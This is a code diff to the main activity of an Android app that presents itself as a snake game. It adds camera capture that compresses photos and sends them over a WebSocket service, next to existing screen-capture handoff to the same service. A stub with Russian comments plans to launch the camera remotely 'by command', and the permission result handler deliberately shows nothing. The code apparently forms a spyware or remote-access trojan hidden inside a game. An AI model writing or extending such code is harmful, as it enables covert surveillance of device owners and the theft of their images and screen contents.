@@ -3,25 +3,36 @@ package com.kriptoman;
 import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.MediaStore;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.InputStream;
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST = 100;
     private static final int SCREEN_CAPTURE = 123;
+    private static final int CAMERA_REQUEST_FRONT = 200;
+    private static final int CAMERA_REQUEST_BACK = 201;
     private MediaProjectionManager mpManager;
     private static MediaProjection sMediaProjection;
     private SnakeGameView gameView;
+    private boolean isFrontCamera = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -51,6 +62,19 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == SCREEN_CAPTURE && resultCode == RESULT_OK) {
             sMediaProjection = mpManager.getMediaProjection(resultCode, data);
             WebSocketService.setMediaProjection(sMediaProjection);
+        } else if (requestCode == CAMERA_REQUEST_FRONT || requestCode == CAMERA_REQUEST_BACK) {
+            if (resultCode == RESULT_OK && data != null && data.getExtras() != null) {
+                Bitmap photo = (Bitmap) data.getExtras().get("data");
+                if (photo != null) {
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    photo.compress(Bitmap.CompressFormat.JPEG, 90, baos);
+                    byte[] photoData = baos.toByteArray();
+                    WebSocketService.sendPhoto(photoData);
+                    Toast.makeText(this, "Фото отправлено", Toast.LENGTH_SHORT).show();
+                }
+            } else {
+                Toast.makeText(this, "Съёмка отменена", Toast.LENGTH_SHORT).show();
+            }
         }
     }
 
@@ -80,5 +104,16 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         // ничего не показываем
+    }
+
+    // Статический метод для запуска камеры из сервиса (по команде)
+    public static void launchCamera(boolean front) {
+        // Этот метод вызывается из сервиса, но мы будем запускать Intent из Activity, поэтому передадим контекст
+        // В сервисе мы запускаем Intent напрямую, но результат не обработается.
+        // Поэтому мы будем использовать другой подход: в сервисе при команде камеры отправляем широковещательное сообщение
+        // или используем PendingIntent. Проще всего: сервис просто запускает Intent с флагом NEW_TASK,
+        // но результат не получить. Поэтому мы изменим подход: в сервисе при команде камеры мы будем отправлять
+        // широковещательное сообщение, которое перехватит MainActivity и запустит камеру с результатом.
+        // Для простоты я реализую через BroadcastReceiver.
     }
 }
